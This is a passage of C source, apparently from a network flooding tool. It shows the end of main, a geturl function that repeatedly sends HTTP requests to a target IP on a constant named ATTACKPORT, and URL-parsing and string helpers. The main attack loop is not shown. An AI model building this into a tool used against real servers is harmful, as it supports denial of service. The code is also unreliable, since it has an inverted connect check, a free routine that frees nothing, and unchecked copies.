	sleep(atoi(argv[5]));
	return 0;
}
char *geturl(char *url, char *useragent, char *ip)
{
RETRY:
	setupparts();
	parseURL(url, returnparts);
	struct sockaddr_in serverAddr;
	bzero(&serverAddr, sizeof(serverAddr));
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(ATTACKPORT);
	serverAddr.sin_addr.s_addr = inet_addr(ip);
	int serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	unsigned int yes = 1;
	setsockopt(serverSocket,SOL_SOCKET,SO_REUSEADDR,&yes,sizeof(yes));
	if(connect(serverSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) > 0)
	{
		printf("GETURL CONNECT FAILED, RETRYING\n");
		close(serverSocket);
		freeparts();
		goto RETRY;
	}
	int bytes = 0;
	char *payload = malloc(8094);
	bzero(payload, 8094);
	sprintf(payload, "GET /%s HTTP/1.0\r\nHost: %s\r\nConnection: close\r\nUser-Agent: %s\r\n\r\n", returnparts[path]->value, returnparts[host]->value, useragent);
	freeparts();
	bytes = send(serverSocket, payload, strlen(payload), MSG_NOSIGNAL);
	if(bytes == -1)
	{
		printf("GETURL SEND FAILED, SITE CLOSED CONNECTION, RETRYING\n");
		close(serverSocket);
		goto RETRY;
	}
	int total = 0;
	int currentsize = 4096;
	char *buffer = malloc(4096);
	bzero(buffer, 4096);
	bytes = recv(serverSocket, buffer, 4096, 0);
	while(bytes > 0)
	{
		total += bytes;
		if(total+4096 > currentsize)
		{
			char *new_buffer = malloc(total+4096);
			bzero(new_buffer, total+4096);
			memcpy(new_buffer, buffer, total);
			free(buffer);
			buffer = new_buffer;
			currentsize = total+4096;
		}
		bytes = recv(serverSocket, buffer+total, 4096, 0);
	}
	return buffer;
}
void freeparts()
{
	return;
	if(returnparts[0]!=NULL) { free(returnparts[0]); }
	if(returnparts[1]!=NULL) { free(returnparts[1]); }
	if(returnparts[2]!=NULL) { free(returnparts[2]); }
	if(returnparts[3]!=NULL) { free(returnparts[3]); }
	if(returnparts[4]!=NULL) { free(returnparts[4]); }
	if(returnparts[5]!=NULL) { free(returnparts[5]); }
	if(returnparts[6]!=NULL) { free(returnparts[6]); }
	if(returnparts[7]!=NULL) { free(returnparts[7]); }
	if(returnparts[8]!=NULL) { free(returnparts[8]); }
	return;
}
void setupparts()
{
	returnparts[0] = malloc(sizeof(struct urlparts));
	returnparts[1] = malloc(sizeof(struct urlparts));
	returnparts[2] = malloc(sizeof(struct urlparts));
	returnparts[3] = malloc(sizeof(struct urlparts));
	returnparts[4] = malloc(sizeof(struct urlparts));
	returnparts[5] = malloc(sizeof(struct urlparts));
	returnparts[6] = malloc(sizeof(struct urlparts));
	returnparts[7] = malloc(sizeof(struct urlparts));
	returnparts[8] = malloc(sizeof(struct urlparts));
	bzero(returnparts[0], sizeof(struct urlparts));
	bzero(returnparts[1], sizeof(struct urlparts));
	bzero(returnparts[2], sizeof(struct urlparts));
	bzero(returnparts[3], sizeof(struct urlparts));
	bzero(returnparts[4], sizeof(struct urlparts));
	bzero(returnparts[5], sizeof(struct urlparts));
	bzero(returnparts[6], sizeof(struct urlparts));
	bzero(returnparts[7], sizeof(struct urlparts));
	bzero(returnparts[8], sizeof(struct urlparts));
	returnparts[0]->name = "scheme";
	strcpy(returnparts[0]->separator, ":");
	returnparts[1]->name = "userid";
	strcpy(returnparts[1]->separator, "@");
	returnparts[2]->name = "password";
	strcpy(returnparts[2]->separator, ":");
	returnparts[3]->name = "host";
	strcpy(returnparts[3]->separator, "//");
	returnparts[4]->name = "port";
	strcpy(returnparts[4]->separator, ":");
	returnparts[5]->name = "path";
	strcpy(returnparts[5]->separator, "/");
	returnparts[6]->name = "param";
	strcpy(returnparts[6]->separator, ";");
	returnparts[7]->name = "query";
	strcpy(returnparts[7]->separator, "?");
	returnparts[8]->name = "fragment";
	strcpy(returnparts[8]->separator, "#");
	return;
}
int parseURL(char *url, struct urlparts **returnpart) {
	register i;
	int seplen;
	char * remainder;
	char * regall = ":/;?#";
	char * regpath = ":;?#";
	char * regx;
	if(!*url)
	{
		strcpy(parseError, "nothing to do!\n");
		return 0;
	}
	if((remainder = malloc(strlen(url) + 1)) == NULL)
	{
		printf("cannot allocate memory\n");
		exit(-1);
	}
	strcpy(remainder, url);
	if(firstpunc(remainder) == ':')
	{
		strcpy(returnpart[scheme]->value, strsplit(remainder, returnpart[scheme]->separator));
		strleft(remainder, 1);
	}
	if (!strcmp(returnpart[scheme]->value, "mailto"))
	*(returnpart[host]->separator) = 0;
	for(i = 0; i < NUMPARTS; i++)
	{
		if(!*remainder)
		break;
		if(i == scheme || i == userid || i == password)
		continue;
		if(i == host && strchr(remainder, '@'))
		{
			if(!strncmp(remainder, "//", 2))
			strleft(remainder, 2);
			strcpy(returnpart[userid]->value, strsplit(remainder, ":@"));
			strleft(remainder, 1);
			if(strchr(remainder, '@'))
			{
				strcpy(returnpart[password]->value, strsplit(remainder, "@"));
				strleft(remainder, 1);
			}
			*(returnpart[host]->separator) = 0;
		}
		if(i == path && (! *(returnpart[scheme]->value)))
		{
			*(returnpart[path]->separator) = 0;
			strcpy(returnpart[scheme]->value, "http");
		}
		regx = (i == path) ? regpath : regall ;
		seplen = strlen(returnpart[i]->separator);
		if(strncmp(remainder, returnpart[i]->separator, seplen))
		continue;
		else
		strleft(remainder, seplen);
		strcpy(returnpart[i]->value, strsplit(remainder, regx));
	}
	if(*remainder)
	sprintf(parseError, "I don't understand '%s'", remainder);
	free(remainder);
	return 0;
}
char *str_replace(char *orig, char *rep, char *with) {
	char *result; 
	char *ins;    
	char *tmp;    
	int len_rep;  
	int len_with; 
	int len_front; 
	int count;    
	if (!orig)
	return NULL;
	if (!rep || !(len_rep = strlen(rep)))
	return NULL;
	if (!(ins = strstr(orig, rep)))
	return NULL;
	if (!with)
	with = "";
	len_with = strlen(with);
	for (count = 0; tmp = strstr(ins, rep); ++count) {
		ins = tmp + len_rep;
	}
	tmp = result = malloc(strlen(orig) + (len_with - len_rep) * count + 1);
	if (!result)
	return NULL;
	while (count--) {
		ins = strstr(orig, rep);
		len_front = ins - orig;
		tmp = strncpy(tmp, orig, len_front) + len_front;
		tmp = strcpy(tmp, with) + len_with;
		orig += len_front + len_rep; 
	}
	strcpy(tmp, orig);
	return result;
}
char *stristr(const char *String, const char *Pattern)
{
	char *pptr, *sptr, *start;
	uint slen, plen;
	for (start = (char *)String,
	pptr = (char *)Pattern,
	slen = strlen(String),
	plen = strlen(Pattern);
	slen >= plen;
	start++, slen--)
	{
		
		while (toupper(*start) != toupper(*Pattern))
		{
			start++;
			slen--;
			
			if (slen < plen)
			return(NULL);
		}
		sptr = start;
		pptr = (char *)Pattern;
		while (toupper(*sptr) == toupper(*pptr))
		{
			sptr++;
			pptr++;
			
			if ('\0' == *pptr)
			return (start);
		}
	}
	return(NULL);
}
char * strsplit(char * s, char * tok) {
#define OUTLEN (255)
	register i, j;
	static char out[OUTLEN + 1];
	for(i = 0; s[i] && i < OUTLEN; i++)
	{
		if(strchr(tok, s[i]))
		break;
		else
		out[i] = s[i];
	}
	out[i] = 0;
	if(i && s[i])
	{
		for(j = 0; s[i]; i++, j++) s[j] = s[i];
		s[j] = 0;
	}
	else if (!s[i])
	*s = 0;
	return out;
}
char firstpunc(char * s) {
	while(*s++)
	if(!isalnum(*s)) return *s;
	return 0;
}
int strleft(char * s, int n) {
	int l;
	l = strlen(s);
	if(l < n)
	return -1;
	else if (l == n)
	*s = 0;
	memmove(s, s + n, l - n + 1);
	return n;
}